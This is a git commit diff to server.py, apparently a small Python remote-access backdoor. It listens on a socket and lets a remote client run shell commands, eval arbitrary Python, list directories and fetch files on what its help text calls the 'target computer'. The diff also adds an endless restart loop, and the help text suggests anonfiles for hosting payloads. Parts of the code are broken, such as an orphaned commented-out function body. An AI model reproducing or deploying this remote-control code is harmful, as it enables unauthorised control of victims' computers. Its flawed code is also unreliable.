a5d370ca18171fb86bc46db2a6086465717ded3d
kamilk0192 <kamilk0192@gmail.com>
2023-01-23 23:25:29 +0100

    Update server.py

--- server.py
+++ server.py
@@ -1,4 +1,5 @@
 #Imports
+import ctypes
 import os
 import socket
 import sys
@@ -13,25 +14,38 @@ import wget
 port = 9091
 
 #CMDS
-def shellcmd(args):
-    cmd = args[1]
-    
+def help(args):
     try:
+        output = "shellcmd - Launch CMD command on target computer   Example: shellcmd|echo A   ///   "
+        output += "uploadfilewww - Download a file on target computer from web   Example: uploadfilewww|https://directlinktofile/text.txt   ///   "
+        output += "osname - Prints type of system on target computer   ///   "
+        output += "listdirectory - Lists folders and files inside desired directory on target computer   Example: listdirectory|D:   ///   "
+        output += 'remexec - Remote execution of python code on target computer   Example: remexec|print("a")   ///   '
+        #output += "changewallpaper - Change desktop wallpaper on target computer   Example: changewallpaper|D:/file.png   ///   "
+        print(output)
+    except:
+        print("Error in help command???")
+    return output
+
+
+def shellcmd(args):
+    try:
+        cmd = args[1]
         output = subprocess.check_output(cmd, shell=True)
     except:
-        print("error in shellcmd (fix your windows shell command)")
-        output = "error"
+        print("Error in shellcmd (fix your windows shell command)")
+        output = "Error in shellcmd (fix your windows shell command)"
     print(output)
     return output
     
 def uploadfilewww(args):
-    url = args[1]
-    location = args[2]
     try:
+        url = args[1]
+        location = args[2]
         output = "Downloaded " + url + " to " + location
     except:
-        print("error in uploadfilewww (use anonfiles and copy download link)")
-        output = "error"
+        print("Error in uploadfilewww (use anonfiles and copy download link)")
+        output = "Error in uploadfilewww (use anonfiles and copy download link)"
     return output
 
 def osname(args):
@@ -40,26 +54,38 @@ def osname(args):
 
 def listdirectory(args):
     print("listing directories")
-    dir = args[1]
     try:
+        dir = args[1]
         output = os.listdir(dir)
     except:
-        print("error in list directory")
-        output = "error"
+        print("Error in list directory")
+        output = "Error in list directory"
     return output
 
 def remexec(args):
-    remcode = args[1]
-    output = ""
-    output = eval(remcode)
     try:
+        remcode = args[1]
+        output = ""
+        output = eval(remcode)
         output = eval(remcode)
     except:
-        print("except error in remote exec (fix your python command)")
-        output = "error"
+        print("Error in remote exec (fix your python command)")
+        output = "Error in remote exec (fix your python command)"
     print(str(output))
     return str(output)
-    
+
+#def changewallpaper(args):
+    try:
+        path = args[1]
+        path = path.replace("/",r'\\')
+        print(path)
+        print(repr(path))
+        SPI_SETDESKWALLPAPER = 20 
+        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, r'D:\\file.jpg', 3) 
+        output = ("Wallpaper has been set to", path)
+    except:
+        print("Error in changewallpaper")
+    return output
 
 #Functions
 #def setup():
@@ -76,6 +102,7 @@ def executecmd(args):
 
 #Main
 def main():
+    print("Server is active on 127.0.0.1:", port)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.bind(("", port))
         sock.listen(9999)
@@ -90,9 +117,18 @@ def main():
                     receivedCMD = receivedCMD[2:-1]
                     CMDandArgs = receivedCMD.split("|")
                     print(CMDandArgs)
-                    cmdOut = executecmd(CMDandArgs)
-                    print(cmdOut)
-                    if(cmdOut != ""):
-                        conn.sendall(str(cmdOut).encode("utf-8"))
+                    try:
+                        cmdOut = executecmd(CMDandArgs)
+                        print(cmdOut)
+                        if(cmdOut != ""):
+                            conn.sendall(str(cmdOut).encode("utf-8"))
+                    except:
+                        msg = "Command Error"
+                        conn.sendall(msg.encode("utf-8"))
+                        print("Command Error")
             
-main()
+while True:
+    print("Starting...")
+    main()
+    print("Server Closed or Crashed...")
+    print("Restarting...")
